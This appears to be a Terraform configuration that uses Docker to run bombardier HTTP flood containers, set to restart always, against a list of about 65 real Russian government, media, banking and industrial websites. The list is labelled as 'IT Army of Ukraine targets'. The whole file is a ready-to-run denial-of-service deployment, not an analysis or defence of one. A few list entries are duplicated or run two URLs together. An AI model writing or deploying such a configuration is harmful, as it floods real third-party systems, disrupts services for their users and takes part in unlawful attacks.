terraform {
  required_providers {
    docker = {
      source  = "kreuzwerker/docker"
      version = ">= 2.13.0"
    }
  }
}

variable "targets" {
  description = "IT Army of Ukraine targets"
  type        = list(string)
  default = [
    "https://anti-maidan.com/",
    "https://lenta.ru/",
    "https://ria.ru/",
    "https://ria.ru/",
    "https://www.rbc.ru/",
    "https://www.rt.com/ http://kremlin.ru/",
    "http://en.kremlin.ru/",
    "https://smotrim.ru/",
    "https://tass.ru/",
    "https://tvzvezda.ru/",
    "https://vsoloviev.ru/",
    "https://www.1tv.ru/",
    "https://www.vesti.ru/",
    "https://online.sberbank.ru/",
    "https://sberbank.ru/",
    "https://zakupki.gov.ru/",
    "https://www.gosuslugi.ru/",
    "https://er.ru/",
    "https://www.rzd.ru/",
    "https://rzdlog.ru/",
    "https://vgtrk.ru/",
    "https://www.interfax.ru/",
    "https://www.mos.ru/",
    "http://government.ru/",
    "https://mil.ru/",
    "https://www.nalog.gov.ru/",
    "https://customs.gov.ru/",
    "https://pfr.gov.ru/",
    "https://rkn.gov.ru/",
    "https://www.gazprombank.ru/",
    "https://www.vtb.ru/",
    "https://www.gazprom.ru/",
    "https://lukoil.ru",
    "https://magnit.ru/",
    "https://www.nornickel.com/",
    "https://www.surgutneftegas.ru/",
    "https://www.tatneft.ru/",
    "https://www.evraz.com/ru/",
    "https://nlmk.com/",
    "https://www.sibur.ru/",
    "https://www.severstal.com/",
    "https://www.metalloinvest.com/",
    "https://nangs.org/",
    "https://rmk-group.ru/",
    "https://www.tmk-group.ru/",
    "https://ya.ru/",
    "https://www.polymetalinternational.com/ru/",
    "https://www.uralkali.com/ru/",
    "https://www.eurosib.ru/",
    "https://omk.ru/",
    "https://mail.rkn.gov.ru/",
    "https://cloud.rkn.gov.ru/",
    "https://mvd.gov.ru/",
    "https://pwd.wto.economy.gov.ru/",
    "https://stroi.gov.ru/",
    "https://proverki.gov.ru/",
    "https://www.gazeta.ru/",
    "https://www.crimea.kp.ru/",
    "https://www.kommersant.ru/",
    "https://riafan.ru/",
    "https://www.mk.ru/",
    "https://api.sberbank.ru/",
    "https://api.sberbank.ru/",
    "https://www.vedomosti.ru/",
    "https://sputnik.by/"
  ]

}
provider "docker" {}

resource "docker_image" "bombardier" {
  name         = "alpine/bombardier"
  keep_locally = false
}

resource "docker_container" "bombardier" {
  for_each = toset(var.targets)
  image   = docker_image.bombardier.latest
  name    = each.value
  restart = "always"
  command = ["-c", "10", "-d", "3600s", "-k", each.value]
}
